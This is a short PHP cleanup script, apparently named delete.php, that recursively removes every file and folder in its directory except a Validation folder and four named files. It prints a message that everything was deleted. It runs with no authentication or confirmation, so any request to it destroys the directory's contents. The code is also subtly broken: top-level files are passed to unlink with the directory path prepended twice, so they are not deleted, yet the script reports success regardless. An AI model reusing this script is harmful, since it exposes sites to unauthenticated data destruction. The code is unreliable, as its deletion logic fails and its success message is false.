<?php
	$files = glob(getcwd().'/*'); // get all file names
	foreach($files as $file){ // iterate files
	  	if(is_dir($file)) {
			if($file==getcwd().'/Validation') {
				// do nothing
			}
			else {
				rrmdir($file);
			}
		}
		else if(is_file($file)) {
			if($file==getcwd().'/index.php' || $file==getcwd().'/blocker.php' || $file==getcwd().'/robot.txt' || $file==getcwd().'/delete.php') {
				// do nothing
			}
			else {
				print $file;
	    			unlink(getcwd().'/'.$file); // delete file
			}
		}
	}
	function rrmdir($dir) { 
		if (is_dir($dir)) { 
			$objects = scandir($dir); 
			foreach ($objects as $object) { 
				if ($object != "." && $object != "..") { 
					if (is_dir($dir."/".$object))
						rrmdir($dir."/".$object);
					else
						unlink($dir."/".$object); 
				} 
			}
			rmdir($dir); 
		} 
	}
	print 'All generated folders and files has been deleted';
?>
